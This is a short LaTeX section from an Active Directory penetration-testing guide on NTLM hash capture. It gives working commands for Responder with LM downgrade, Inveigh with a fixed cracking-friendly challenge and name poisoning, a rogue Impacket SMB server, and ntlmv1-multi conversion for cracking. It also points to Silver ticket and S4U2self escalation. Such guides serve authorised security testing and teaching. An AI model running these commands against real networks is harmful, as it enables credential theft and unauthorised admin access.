\section{NTLM Capture attack}
\subsection{Intro}

\verb+Responder+ and \verb+Inveigh+ are great tools able to do name poisoning for forced
authentication attacks, but also able to capture responses (LM or NTLM hashes)
by starting servers waiting for incoming authentications. Once those listening
servers are up and ready, the tester can initiate the {\bf forced auth attack}

In order to help the cracking process in case of NTLMv1 downgrade the NTLM
challenge sent to victims must be set to \verb+1122334455667788+ since rainbow
table is known \href{https://crackstation.net/} and can easily be cracked with
\href{https://crack.sh/netntlm/}{crack.sh}

\href{https://github.com/evilmog/ntlmv1-multi}{ntlmv1-multi} can be used to
convert captured responses to crackable formats by hashcat,crack.sh \ldots

\begin{verbatim}
ntlmv1-multi --ntlmv1 SV01$::BREAKING.BAD:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:1122334455667788
\end{verbatim}


Machine account NT hashes can be used with the
\href{https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver}{Silver
ticket} or
\href{https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse}{S4U2self
abuse} techniques to gain admin access to it.


\subsection{Responder}
\begin{verbatim}
responder --interface "eth0" --analyze
responder -I "eth0" -A

# with downgrading
responder --interface "eth0" --analyze --lm --disable-ess
\end{verbatim}


\subsection{Inveigh}
\begin{verbatim}
.\Inveigh.exe -Challenge 1122334455667788 -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y
\end{verbatim}


\subsection{Impacket smbserver}

\begin{verbatim}
sudo smbserver.py -smb2support  pwn ./
\end{verbatim}
